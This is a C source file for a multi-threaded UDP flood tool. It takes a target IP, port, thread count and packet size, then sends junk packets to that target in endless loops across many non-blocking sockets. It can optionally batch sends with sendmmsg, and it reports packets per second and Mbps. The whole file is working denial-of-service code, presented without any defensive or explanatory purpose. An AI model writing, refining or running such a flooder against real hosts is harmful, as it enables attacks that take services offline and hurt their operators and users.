#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <fcntl.h>

#define SO_SNDBUF_SIZE (1024 * 1024 * 16)
#define NON_BLOCKING 1

int pps_counter = 0;
int mbps_counter = 0;

struct thread_args {
    char ip[64];
    int port;
    int packet_size;
    char payload_mode[16];
    char* payload;
};

void* pps_monitor(void* arg) {
    (void)arg;
    while (1) {
        sleep(1);
        double mbps = (mbps_counter * 8.0) / 1000000.0;
        time_t now = time(NULL);
        struct tm* t = localtime(&now);
        printf("\033[96m[%02d:%02d:%02d] PPS: %d | Mbps: %.2f\033[0m\n", 
            t->tm_hour, t->tm_min, t->tm_sec,
            pps_counter, mbps);
        pps_counter = 0;
        mbps_counter = 0;
    }
    return NULL;
}

void generate_payload(char* buf, int size, const char* mode) {
    if (strcmp(mode, "null") == 0) {
        memset(buf, 0, size);
    } else if (strcmp(mode, "text") == 0) {
        memset(buf, 'A', size);
    } else if (strcmp(mode, "ascii") == 0) {
        for (int i = 0; i < size; i++) {
            buf[i] = (char)(33 + rand() % 94);
        }
    } else if (strcmp(mode, "random") == 0) {
        for (int i = 0; i < size; i++) {
            buf[i] = (char)(rand() % 256);
        }
    } else {
        for (int i = 0; i < size; i++) {
            buf[i] = (char)(rand() % 256);
        }
    }
}

void* udp_flood(void* arguments) {
    struct thread_args* args = (struct thread_args*)arguments;
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) return NULL;

    int sndbuf = SO_SNDBUF_SIZE;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    #if NON_BLOCKING
    fcntl(sockfd, F_SETFL, O_NONBLOCK);
    #endif

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &target.sin_addr);

    #ifdef USE_SENDMMSG
    struct mmsghdr msgs[32];
    struct iovec iovs[32];
    for (int i = 0; i < 32; i++) {
        iovs[i].iov_base = args->payload;
        iovs[i].iov_len = args->packet_size;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &target;
        msgs[i].msg_hdr.msg_namelen = sizeof(target);
    }
    #endif

    while (1) {
        #ifdef USE_SENDMMSG
        int sent = sendmmsg(sockfd, msgs, 32, 0);
        __sync_fetch_and_add(&pps_counter, sent);
        __sync_fetch_and_add(&mbps_counter, sent * args->packet_size);
        #else
        sendto(sockfd, args->payload, args->packet_size, 0, 
              (struct sockaddr*)&target, sizeof(target));
        __sync_fetch_and_add(&pps_counter, 1);
        __sync_fetch_and_add(&mbps_counter, args->packet_size);
        #endif
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc < 6) {
        printf("Usage: %s <ip> <port> <threads> <packet_size> <protocol> [payload_mode]\n", argv[0]);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    char* protocol = argv[5];
    char* payload_mode = (argc > 6) ? argv[6] : "random";

    printf("\033[96m[*] Target: %s:%d\n[*] Threads: %d, Size: %d, Protocol: %s, Payload: %s\033[0m\n",
           ip, port, threads, packet_size, protocol, payload_mode);

    srand(time(NULL));

    char* shared_payload = malloc(packet_size);
    if (!shared_payload) {
        perror("malloc payload");
        return 1;
    }
    generate_payload(shared_payload, packet_size, payload_mode);

    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);
    pthread_detach(monitor_thread);

    pthread_t thread_ids[threads];

    for (int i = 0; i < threads; i++) {
        struct thread_args* args = malloc(sizeof(struct thread_args));
        if (!args) {
            perror("malloc args");
            return 1;
        }
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->packet_size = packet_size;
        strncpy(args->payload_mode, payload_mode, sizeof(args->payload_mode) - 1);
        args->payload_mode[sizeof(args->payload_mode) - 1] = '\0';
        args->payload = shared_payload;

        pthread_create(&thread_ids[i], NULL, udp_flood, args);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(shared_payload);

    return 0;
}
